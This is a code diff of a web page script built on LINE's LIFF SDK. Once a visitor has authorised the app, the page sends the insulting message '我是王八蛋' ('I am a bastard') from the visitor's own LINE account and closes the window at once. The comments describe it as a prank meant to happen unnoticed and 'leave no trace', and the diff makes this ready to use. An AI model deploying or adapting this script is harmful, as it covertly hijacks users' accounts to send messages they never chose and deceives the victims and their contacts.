@@ -12,15 +12,15 @@
     </div>
 
     <script>
-        // 初始化 LIFF (已經綁定你申請好的專屬 ID)
+        // 初始化 LIFF (完全移除測試用的 alert)
         liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
             if (!liff.isLoggedIn()) {
                 liff.login(); // 沒授權過就引導登入
             } else {
-                // 已授權狀態下，直接神不知鬼不覺自動發送訊息
+                // 已授權狀態下，直接全自動發送訊息
                 liff.sendMessages([{
                     type: 'text',
-                    text: '我是王八蛋！' // 👈 【未來可以在這裡修改你想惡整的字！】
+                    text: '我是王八蛋' 
                 }]).then(() => {
                     liff.closeWindow(); // 傳送成功後「立刻自動關閉網頁」，不留痕跡
                 }).catch((err) => {
